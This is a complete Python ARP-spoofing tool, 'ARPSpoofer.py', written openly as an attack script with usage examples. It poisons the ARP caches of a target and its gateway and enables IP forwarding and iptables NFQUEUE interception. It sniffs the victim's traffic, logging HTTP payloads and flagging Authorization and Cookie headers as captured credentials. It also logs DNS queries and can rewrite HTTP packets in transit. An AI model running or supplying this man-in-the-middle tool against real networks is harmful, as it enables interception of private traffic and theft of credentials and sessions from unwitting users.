"""
Script Name: ARPSpoofer.py
Author: Justin Andrews
Version: 1.0
Date: 2024-03-19

Description:
    This script performs ARP spoofing attacks between a target and gateway by sending spoofed ARP responses. 
    Uses platform-specific packet handling for MITM capabilities.

Arguments:
    target_ip            Target IP address to spoof
    gateway_ip           Gateway IP address to spoof
    interface           Network interface to use (supports Windows interface names with spaces)
    -i, --interval      Interval between ARP responses in seconds (default: 2)
    -r, --restore       Number of restore packets to send (default: 5)
    -m, --monitor       Enable traffic monitoring
    -p, --ports         Comma-separated ports to monitor (default: 80,443)
    -f, --forward       Enable packet forwarding
    -d, --debug         Enable debug output
    -l, --logging       Enable logging to file
    -q, --queue-num     NetfilterQueue number (default: 1, Linux only)

Usage:
    Basic spoofing (Windows):
        python ARPSpoofer.py 192.168.1.2 192.168.1.1 "Wi-Fi"
        python ARPSpoofer.py 192.168.1.2 192.168.1.1 "Ethernet"

    With packet interception:
        python ARPSpoofer.py 192.168.1.2 192.168.1.1 "Wi-Fi" -m -f -p 80,443

Example:
    python ARPSpoofer.py 192.168.1.2 192.168.1.1 "Wi-Fi" -m -f -i 5 -d -l

GUI Parameters:
"target_ip": ""
"gateway_ip": ""
"interface": ""
"interval": 2
"restore_count": 5
"monitor": false
"ports": "80,443"
"forward": false
"debug": false
"logging": false
"queue_num": 1
"persistent": false
"""

import sys
import threading
import time
import signal
import platform
import subprocess
from datetime import datetime
from typing import Optional, Any, Dict, List

# Import scapy modules
from scapy.all import sendp, srp, sniff, conf, get_if_hwaddr
from scapy.arch.windows import get_windows_if_list
from scapy.layers.inet import Ether, IP, TCP, UDP, raw, ICMP
from scapy.layers.l2 import ARP

# Local imports
from Utils import LoggingPipeline, ArgumentHandler, SystemCommand, Threading

# Try to import netfilterqueue on Linux systems
HAVE_NFQ = False
if platform.system().lower() != "windows":
    try:
        from netfilterqueue import NetfilterQueue

        HAVE_NFQ = True
    except ImportError:
        pass


class NetworkInterface:
    """Handles network interface operations for both Windows and Unix systems."""

    def __init__(self, interface_name: str, logger: LoggingPipeline):
        """
        Initialize network interface handler.
        Args:
            interface_name (str): Name or description of the interface
            logger (LoggingPipeline): Logger instance
        """
        self.name = interface_name
        self.logger = logger
        self.logger.append_log(
            f"Attempting to initialize interface: {interface_name}", "DEBUG"
        )

        # Debug OS type
        self.logger.append_log(f"Operating System: {platform.system()}", "DEBUG")

        self.info = self._get_interface_info()
        self.logger.append_log(f"Interface info result: {self.info}", "DEBUG")

        if not self.info:
            available = self._get_available_interfaces()
            self.logger.append_log(
                f"Interface '{interface_name}' not found. Available interfaces:\n"
                f"{available}",
                "ERROR",
            )
            sys.exit(1)

    def _get_windows_interfaces(self) -> List[Dict[str, str]]:
        """Get list of Windows network interfaces."""
        interfaces = []
        try:
            self.logger.append_log("Getting Windows interface list", "DEBUG")
            interfaces_list = get_windows_if_list()
            self.logger.append_log(f"Found {len(interfaces_list)} interfaces", "DEBUG")

            for iface in interfaces_list:
                if iface.get("name") and iface.get("mac"):
                    self.logger.append_log(
                        f"Processing interface: {iface.get('name')}", "DEBUG"
                    )
                    interfaces.append(
                        {
                            "name": iface["name"],
                            "description": iface.get("description", ""),
                            "mac": iface["mac"],
                            "guid": iface.get("guid", ""),
                        }
                    )
        except Exception as e:
            self.logger.append_log(
                f"Error getting Windows interfaces: {str(e)}", "ERROR"
            )
        return interfaces

    def _get_interface_info(self) -> Optional[Dict[str, str]]:
        """Get interface information including MAC address."""
        try:
            if platform.system() == "Windows":
                self.logger.append_log("Getting Windows interface info", "DEBUG")
                interfaces = self._get_windows_interfaces()
                self.logger.append_log(
                    f"Found {len(interfaces)} Windows interfaces", "DEBUG"
                )

                # First try exact match on interface name
                for iface in interfaces:
                    if self.name.lower() == iface["name"].lower():
                        self.logger.append_log(
                            f"Found exact match for interface: {iface['name']}", "DEBUG"
                        )
                        return {
                            "name": iface["name"],
                            "mac": iface["mac"],
                            "description": iface.get("description", ""),
                        }

                # If no exact match, try to match without any filter/driver suffixes
                for iface in interfaces:
                    base_name = iface["name"].split("-")[0].strip()
                    if self.name.lower() == base_name.lower():
                        self.logger.append_log(
                            f"Found base name match for interface: {iface['name']}",
                            "DEBUG",
                        )
                        return {
                            "name": iface["name"],
                            "mac": iface["mac"],
                            "description": iface.get("description", ""),
                        }

                # Finally, try partial matching but exclude virtual and filter interfaces
                for iface in interfaces:
                    name_lower = iface["name"].lower()
                    desc_lower = iface.get("description", "").lower()

                    # Skip virtual and filter interfaces
                    if any(
                        x in name_lower or x in desc_lower
                        for x in [
                            "virtual",
                            "filter",
                            "npcap",
                            "light-weight",
                            "loopback",
                            "pseudo",
                        ]
                    ):
                        continue

                    if (
                        self.name.lower() in name_lower
                        or self.name.lower() in desc_lower
                    ):
                        self.logger.append_log(
                            f"Found partial match for interface: {iface['name']}",
                            "DEBUG",
                        )
                        return {
                            "name": iface["name"],
                            "mac": iface["mac"],
                            "description": iface.get("description", ""),
                        }

                self.logger.append_log("No matching interface found", "ERROR")
                return None
            else:
                self.logger.append_log("Getting Unix interface info", "DEBUG")
                try:
                    mac = get_if_hwaddr(self.name)
                    self.logger.append_log(f"Got MAC address: {mac}", "DEBUG")
                    return {"name": self.name, "mac": mac, "description": self.name}
                except Exception as e:
                    self.logger.append_log(
                        f"Error getting interface MAC: {str(e)}", "ERROR"
                    )
                    return None

        except Exception as e:
            self.logger.append_log(f"Error getting interface info: {str(e)}", "ERROR")
            return None

    def _get_available_interfaces(self) -> str:
        """Get formatted string of available interfaces."""
        if platform.system() == "Windows":
            interfaces = self._get_windows_interfaces()
            return "\n".join(
                f"- {iface['name']} ({iface.get('description', '')})"
                for iface in interfaces
            )
        else:
            from scapy.arch import get_if_list

            interfaces = get_if_list()
            return "\n".join(f"- {iface}" for iface in interfaces)

    @property
    def system_name(self) -> str:
        """Get system-specific interface name."""
        return self.info["name"]

    @property
    def mac(self) -> str:
        """Get interface MAC address."""
        return self.info["mac"]

    @property
    def description(self) -> str:
        """Get interface description."""
        return self.info["description"]

class PacketStats:
    """Track packet statistics and protocol information."""
    
    def __init__(self):
        self.total_packets = 0
        self.protocol_stats = {
            'tcp': 0,
            'udp': 0,
            'icmp': 0,
            'other': 0
        }
        self.http_requests = 0
        self.https_connections = 0
        self.dns_queries = 0
        self.data_transferred = 0  # in bytes
        self.start_time = datetime.now()
        
    def update(self, packet):
        """Update statistics based on packet."""
        self.total_packets += 1
        
        # Track protocol statistics
        if TCP in packet:
            self.protocol_stats['tcp'] += 1
            if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                self.http_requests += 1
            elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
                self.https_connections += 1
        elif UDP in packet:
            self.protocol_stats['udp'] += 1
            if packet[UDP].dport == 53 or packet[UDP].sport == 53:
                self.dns_queries += 1
        elif ICMP in packet:
            self.protocol_stats['icmp'] += 1
        else:
            self.protocol_stats['other'] += 1
            
        # Track data volume
        if IP in packet:
            self.data_transferred += len(packet[IP])
            
    def get_summary(self) -> str:
        """Get formatted summary of packet statistics."""
        duration = (datetime.now() - self.start_time).total_seconds()
        
        return f"""
Packet Sniffing Summary:
=======================
Duration: {duration:.1f} seconds
Total Packets: {self.total_packets}
Data Transferred: {self.data_transferred/1024/1024:.2f} MB

Protocol Distribution:
- TCP: {self.protocol_stats['tcp']} ({self.protocol_stats['tcp']/self.total_packets*100:.1f}%)
- UDP: {self.protocol_stats['udp']} ({self.protocol_stats['udp']/self.total_packets*100:.1f}%)
- ICMP: {self.protocol_stats['icmp']} ({self.protocol_stats['icmp']/self.total_packets*100:.1f}%)
- Other: {self.protocol_stats['other']} ({self.protocol_stats['other']/self.total_packets*100:.1f}%)

Application Layer:
- HTTP Requests: {self.http_requests}
- HTTPS Connections: {self.https_connections}
- DNS Queries: {self.dns_queries}

Average Throughput: {self.data_transferred/1024/duration:.2f} KB/s
"""

class ARPSpoofer:
    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        interface: str,
        interval: int = 2,
        restore_count: int = 5,
        monitor: bool = False,
        ports: str = "80,443",
        forward: bool = False,
        debug: bool = False,
        logging: bool = False,
        queue_num: int = 1,
    ):
        """Initialize ARP spoofer with the given parameters."""
        # Initialize components
        self.logger = LoggingPipeline(
            debug=debug, logging=logging, log_name="arp_spoofer"
        )
        self.logger.append_log("Initializing ARP Spoofer", "DEBUG")

        self.system = SystemCommand(debug=debug, logging=logging)
        self.thread_manager = Threading(debug=debug, logging=logging)

        # Initialize network interface
        self.logger.append_log(
            f"Creating NetworkInterface object for: {interface}", "DEBUG"
        )
        self.interface = NetworkInterface(interface, self.logger)
        self.logger.append_log("NetworkInterface object created", "DEBUG")

        # Store parameters
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = max(1, interval)
        self.restore_count = max(1, restore_count)
        self.monitor = monitor
        self.forward = forward
        self.ports = {int(p) for p in ports.split(",")} if ports else {80, 443}
        self.queue_num = queue_num
        self.stats = PacketStats()

        # Disable Scapy output
        conf.verb = 0

        # Set up packet monitoring
        if self.monitor or self.forward:
            # Set up packet monitoring in a separate thread
            self.monitor_thread = None
            if platform.system().lower() == "windows":
                # Windows uses a separate thread for monitoring
                self.monitor_thread = threading.Thread(
                    target=self._start_packet_monitoring, daemon=True
                )
            # Linux setup is handled in setup_packet_forwarding

        # Get MAC addresses
        self.logger.append_log(
            f"Getting MAC address for target IP: {target_ip}", "DEBUG"
        )
        self.target_mac = self.get_mac(target_ip)
        if not self.target_mac:
            self.logger.append_log(
                f"Failed to get MAC address for {target_ip}", "ERROR"
            )
            sys.exit(1)

        self.logger.append_log(
            f"Getting MAC address for gateway IP: {gateway_ip}", "DEBUG"
        )
        self.gateway_mac = self.get_mac(gateway_ip)
        if not self.gateway_mac:
            self.logger.append_log(
                f"Failed to get MAC address for {gateway_ip}", "ERROR"
            )
            sys.exit(1)

        self.logger.append_log(
            f"Initialized ARP spoofer:\n"
            f"Target: {target_ip} ({self.target_mac})\n"
            f"Gateway: {gateway_ip} ({self.gateway_mac})\n"
            f"Interface: {self.interface.description} ({self.interface.mac})",
            "SUCCESS",
        )

        self.running = False
        self.packet_stats = {"forwarded": 0, "modified": 0, "dropped": 0}
        self.nfqueue = None
        self.logger.append_log(f"Interface at end of init: {self.interface}", "DEBUG")
    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP using ARP request."""
        try:
            self.logger.append_log(f"Attempting to resolve MAC for IP: {ip}", "DEBUG")
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

            # Send ARP request with extended timeout and retries
            answers, _ = srp(
                arp_request,
                timeout=5,  # 5 second timeout
                retry=3,  # 3 retries
                iface=self.interface.system_name,
                verbose=False,
            )

            if answers:
                mac_address = answers[0][1].hwsrc
                self.logger.append_log(
                    f"Resolved MAC for {ip}: {mac_address}", "SUCCESS"
                )
                return mac_address

            self.logger.append_log(f"No response for ARP request to {ip}", "ERROR")
            return None

        except Exception as e:
            self.logger.append_log(f"Error resolving MAC for {ip}: {e}", "ERROR")
            return None

    def _start_packet_monitoring(self):
        """Start packet monitoring on Windows."""
        self.logger.append_log(f"Starting monitoring on interface: {self.interface.system_name}", "DEBUG")
        try:
            self.logger.append_log("Starting packet monitoring", "DEBUG")
            sniff(
                iface=self.interface.system_name,
                prn=self.process_packet,
                store=0,
                filter=f"host {self.target_ip} or host {self.gateway_ip}",
            )
        except Exception as e:
            self.logger.append_log(f"Error in packet monitoring: {e}", "ERROR")

    def setup_packet_forwarding(self) -> bool:
        """Set up packet forwarding based on platform capabilities."""
        try:
            if platform.system().lower() != "windows" and HAVE_NFQ:
                # Linux with NetfilterQueue available
                subprocess.run(
                    [
                        "iptables",
                        "-I",
                        "FORWARD",
                        "-j",
                        "NFQUEUE",
                        "--queue-num",
                        str(self.queue_num),
                    ],
                    check=True,
                )

                # Initialize NetfilterQueue
                self.nfqueue = NetfilterQueue()
                self.nfqueue.bind(self.queue_num, self.process_packet_nfqueue)

                self.logger.append_log("NetfilterQueue setup complete", "SUCCESS")
                return True
            else:
                # Windows or Linux without NetfilterQueue
                self.logger.append_log(
                    "Using basic packet forwarding (platform limitation)", "INFO"
                )
                return True

        except Exception as e:
            self.logger.append_log(f"Failed to set up packet forwarding: {e}", "ERROR")
            return False

    def cleanup_packet_forwarding(self) -> None:
        """Clean up packet forwarding setup."""
        try:
            if platform.system().lower() != "windows" and HAVE_NFQ:
                if hasattr(self, "nfqueue"):
                    self.nfqueue.unbind()

                subprocess.run(
                    [
                        "iptables",
                        "-D",
                        "FORWARD",
                        "-j",
                        "NFQUEUE",
                        "--queue-num",
                        str(self.queue_num),
                    ],
                    check=True,
                )

        except Exception as e:
            self.logger.append_log(
                f"Error cleaning up packet forwarding: {e}", "WARNING"
            )

    def process_packet(self, packet: Any) -> None:
        """Process and analyze captured packets."""
        try:
            self.stats.update(packet)
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                # Only process relevant packets
                if not (
                    src_ip in {self.target_ip, self.gateway_ip}
                    or dst_ip in {self.target_ip, self.gateway_ip}
                ):
                    return

                # Basic packet info
                timestamp = datetime.now().strftime("%H:%M:%S")
                packet_info = f"[{timestamp}] {src_ip} -> {dst_ip}"

                # Handle different protocols
                if TCP in packet:
                    src_port = packet[TCP].sport
                    dst_port = packet[TCP].dport
                    packet_info += f" TCP {src_port} -> {dst_port}"
                    
                    # Extract HTTP data if present
                    if dst_port == 80 or src_port == 80:
                        if raw in packet:
                            try:
                                payload = packet[raw].load.decode('utf-8', errors='ignore')
                                if "HTTP" in payload:
                                    self.logger.append_log(
                                        f"HTTP Traffic:\n{packet_info}\n{payload[:1000]}",
                                        "SUCCESS"
                                    )
                                    # Look for interesting headers or POST data
                                    if "Authorization:" in payload or "Cookie:" in payload:
                                        self.logger.append_log(
                                            f"Found credentials or session data:\n{payload}",
                                            "WARNING"
                                        )
                            except Exception as e:
                                self.logger.append_log(f"Error decoding HTTP: {e}", "DEBUG")

                    # Handle HTTPS (just log connection info)
                    elif dst_port == 443 or src_port == 443:
                        self.logger.append_log(f"HTTPS Connection: {packet_info}", "INFO")

                elif UDP in packet:
                    src_port = packet[UDP].sport
                    dst_port = packet[UDP].dport
                    packet_info += f" UDP {src_port} -> {dst_port}"
                    
                    # Handle DNS
                    if dst_port == 53 or src_port == 53:
                        from scapy.layers.dns import DNS
                        if DNS in packet:
                            dns_info = packet[DNS].show(dump=True)
                            self.logger.append_log(f"DNS Query:\n{dns_info}", "INFO")

                # Handle ICMP
                elif ICMP in packet:
                    icmp_type = packet[ICMP].type
                    icmp_code = packet[ICMP].code
                    packet_info += f" ICMP Type:{icmp_type} Code:{icmp_code}"

                # Forward packet if needed
                if self.forward:
                    if (
                        src_ip == self.target_ip and dst_ip == self.gateway_ip or
                        src_ip == self.gateway_ip and dst_ip == self.target_ip
                    ):
                        sendp(packet, iface=self.interface.system_name, verbose=False)
                        self.packet_stats["forwarded"] += 1
                    else:
                        self.packet_stats["dropped"] += 1

                # Log packet summary if monitoring is enabled
                if self.monitor:
                    self.logger.append_log(packet_info, "DEBUG")

        except Exception as e:
            if self.logger.debug:
                self.logger.append_log(f"Error processing packet: {str(e)}", "DEBUG")

    def process_packet_nfqueue(self, nfqueue_packet: Any) -> None:
        """Process packets intercepted by NetfilterQueue (Linux only)."""
        try:
            # Convert netfilter packet to scapy packet
            packet = IP(nfqueue_packet.get_payload())

            # Check if packet is relevant
            if not (
                packet[IP].src in {self.target_ip, self.gateway_ip}
                and packet[IP].dst in {self.target_ip, self.gateway_ip}
            ):
                nfqueue_packet.accept()
                return

            modified = False

            # Example packet modification (customize as needed)
            if TCP in packet and raw in packet:
                payload = packet[raw].load.decode("utf-8", errors="ignore")

                # Example: Modify HTTP headers
                if packet[TCP].dport == 80 and "HTTP" in payload:
                    modified_payload = payload.replace(
                        "\r\n\r\n", "\r\nX-Intercepted: true\r\n\r\n"
                    )
                    packet[raw].load = modified_payload.encode()
                    modified = True

                    # Update packet length and checksums
                    del packet[IP].len
                    del packet[IP].chksum
                    if TCP in packet:
                        del packet[TCP].chksum

            # Accept or drop the packet
            if modified:
                self.packet_stats["modified"] += 1
                nfqueue_packet.set_payload(bytes(packet))
            else:
                self.packet_stats["forwarded"] += 1

            nfqueue_packet.accept()

            # Log interesting traffic
            if self.monitor and (TCP in packet or UDP in packet):
                layer = packet[TCP] if TCP in packet else packet[UDP]
                if layer.sport in self.ports or layer.dport in self.ports:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    protocol = "TCP" if TCP in packet else "UDP"
                    status = "MODIFIED" if modified else "FORWARDED"
                    print(
                        f"[{timestamp}] {packet[IP].src}:{layer.sport} -> "
                        f"{packet[IP].dst}:{layer.dport} [{protocol}] [{status}]"
                    )

        except Exception as e:
            if self.logger.debug:
                self.logger.append_log(f"Error processing packet: {e}", "DEBUG")
            nfqueue_packet.accept()

    def enable_ip_forward(self) -> bool:
        """Enable IP forwarding on the system."""
        try:
            if platform.system().lower() == "windows":
                cmd = ["powershell", "Set-NetIPInterface", "-Forwarding", "Enabled"]
            else:
                cmd = ["sysctl", "-w", "net.ipv4.ip_forward=1"]

            result = self.system.execute(cmd)
            if isinstance(result, str) and "error" in result.lower():
                self.logger.append_log(
                    f"Failed to enable IP forwarding: {result}", "ERROR"
                )
                return False

            self.logger.append_log("IP forwarding enabled", "SUCCESS")
            return True

        except Exception as e:
            self.logger.append_log(f"Error enabling IP forwarding: {e}", "ERROR")
            return False

    def disable_ip_forward(self) -> None:
        """Disable IP forwarding on the system."""
        try:
            if platform.system().lower() == "windows":
                cmd = ["powershell", "Set-NetIPInterface", "-Forwarding", "Disabled"]
            else:
                cmd = ["sysctl", "-w", "net.ipv4.ip_forward=0"]

            self.system.execute(cmd)
            self.logger.append_log("IP forwarding disabled", "SUCCESS")

        except Exception as e:
            self.logger.append_log(f"Error disabling IP forwarding: {e}", "WARNING")

    def spoof(self) -> None:
        """Send spoofed ARP responses to target and gateway."""
        try:
            # Create spoofed packets with proper Ethernet headers
            target_packet = Ether(dst=self.target_mac, src=self.interface.mac) / ARP(
                op=2,  # ARP Reply
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.interface.mac,
            )

            gateway_packet = Ether(dst=self.gateway_mac, src=self.interface.mac) / ARP(
                op=2,  # ARP Reply
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.interface.mac,
            )

            # Send packets at layer 2
            sendp(target_packet, iface=self.interface.system_name, verbose=False)
            sendp(gateway_packet, iface=self.interface.system_name, verbose=False)

            if self.logger.debug:
                self.logger.append_log(
                    f"Sent ARP packets to {self.target_ip} and {self.gateway_ip}",
                    "DEBUG",
                )

        except Exception as e:
            self.logger.append_log(f"Error during spoofing: {e}", "ERROR")
            self.restore()
            sys.exit(1)

    def restore(self) -> None:
        """Restore normal ARP mappings."""
        self.logger.append_log(self.stats.get_summary(), "SUCCESS")
        self.logger.append_log("Restoring ARP tables...", "INFO")
        try:
            # Create restore packets with proper Ethernet headers
            target_packet = Ether(dst=self.target_mac, src=self.gateway_mac) / ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac,
            )

            gateway_packet = Ether(dst=self.gateway_mac, src=self.target_mac) / ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.target_mac,
            )

            # Send multiple restore packets
            for _ in range(self.restore_count):
                sendp(target_packet, iface=self.interface.system_name, verbose=False)
                sendp(gateway_packet, iface=self.interface.system_name, verbose=False)
                time.sleep(0.2)

            self.logger.append_log("ARP tables restored", "SUCCESS")

        except Exception as e:
            self.logger.append_log(f"Error restoring ARP tables: {e}", "ERROR")

    def run(self) -> None:
        """Run the ARP spoofing attack."""
        self.running = True

        print("Invoked run")

        def signal_handler(signum, frame):
            self.logger.append_log("Interrupt received, stopping...", "INFO")
            self.running = False

        signal.signal(signal.SIGINT, signal_handler)

        try:
            # Enable IP forwarding
            if self.forward and not self.enable_ip_forward():
                self.logger.append_log("Failed to enable IP forwarding", "ERROR")
                return

            # Set up packet interception if needed
            using_nfqueue = False
            if self.forward and platform.system().lower() != "windows":
                using_nfqueue = self.setup_packet_forwarding()

            self.logger.append_log(
                f"Starting ARP spoofing attack (interval: {self.interval}s)", "INFO"
            )

            if self.monitor:
                print("\nMonitoring traffic (press Ctrl+C to stop):")
                print(f"Watching ports: {', '.join(map(str, self.ports))}")
                print(f"Packet forwarding: {'ENABLED' if self.forward else 'DISABLED'}")
                if using_nfqueue:
                    print("Using NetfilterQueue for packet interception\n")
                else:
                    print("Using basic packet forwarding\n")

                # Start the monitor thread if on Windows
                if platform.system().lower() == "windows" and self.monitor_thread:
                    self.monitor_thread.start()

            # Start NetfilterQueue if using it
            if using_nfqueue:
                # Start in a separate thread to maintain ARP spoofing
                nfqueue_thread = self.thread_manager.map_threaded(
                    lambda: self.nfqueue.run(),
                    [None],  # Single item for single thread
                    threads=1,
                )[0]

            # Main loop
            while self.running:
                self.spoof()
                time.sleep(self.interval)

        except Exception as e:
            self.logger.append_log(f"Error during operation: {e}", "ERROR")
            raise

        finally:
            self.restore()
            if self.forward:
                self.disable_ip_forward()
                if using_nfqueue:
                    self.cleanup_packet_forwarding()

            if self.logger.file_logging:
                self.logger.generate_log()

            if self.forward:
                self.logger.append_log(
                    f"Packets forwarded: {self.packet_stats['forwarded']}, "
                    f"modified: {self.packet_stats['modified']}, "
                    f"dropped: {self.packet_stats['dropped']}",
                    "INFO",
                )


def main():
    """Main entry point for the script."""
    arg_config = {
        "script": {
            "name": "ARPSpoofer.py",
            "description": "ARP Spoofing Tool",
        },
        "args": {
            "target_ip": {"help": "Target IP address to spoof", "positional": True},
            "gateway_ip": {"help": "Gateway IP address to spoof", "positional": True},
            "interface": {"help": "Network interface to use", "positional": True},
            "interval": {
                "flag": "-i",
                "type": int,
                "default": 2,
                "help": "Interval between ARP responses in seconds",
            },
            "restore_count": {
                "flag": "-r",
                "type": int,
                "default": 5,
                "help": "Number of restore packets to send",
            },
            "monitor": {
                "flag": "-m",
                "action": "store_true",
                "help": "Enable traffic monitoring",
            },
            "ports": {
                "flag": "-p",
                "default": "80,443",
                "help": "Comma-separated ports to monitor",
            },
            "forward": {
                "flag": "-f",
                "action": "store_true",
                "help": "Enable packet forwarding",
            },
            "debug": {
                "flag": "-d",
                "action": "store_true",
                "help": "Enable debug output",
            },
            "logging": {
                "flag": "-l",
                "action": "store_true",
                "help": "Enable logging to file",
            },
            "queue_num": {
                "flag": "-q",
                "type": int,
                "default": 1,
                "help": "NetfilterQueue number",
            },
        },
    }

    # Parse arguments
    arg_handler = ArgumentHandler(arg_config)
    args = arg_handler.parse_args()

    # Initialize spoofer
    spoofer = None
    try:
        spoofer = ARPSpoofer(
            target_ip=args.target_ip,
            gateway_ip=args.gateway_ip,
            interface=args.interface,
            interval=args.interval,
            restore_count=args.restore_count,
            monitor=args.monitor,
            ports=args.ports,
            forward=args.forward,
            debug=args.debug,
            logging=args.logging,
            queue_num=args.queue_num,
        )
        spoofer.run()

    except KeyboardInterrupt:
        if spoofer and spoofer.logger:
            spoofer.logger.append_log("\nARP spoofing interrupted by user", "WARNING")
    except Exception as e:
        if spoofer and spoofer.logger:
            spoofer.logger.append_log(f"Fatal error: {str(e)}", "ERROR")
            if args.debug:
                import traceback

                spoofer.logger.append_log(traceback.format_exc(), "ERROR")
        sys.exit(1)


if __name__ == "__main__":
    main()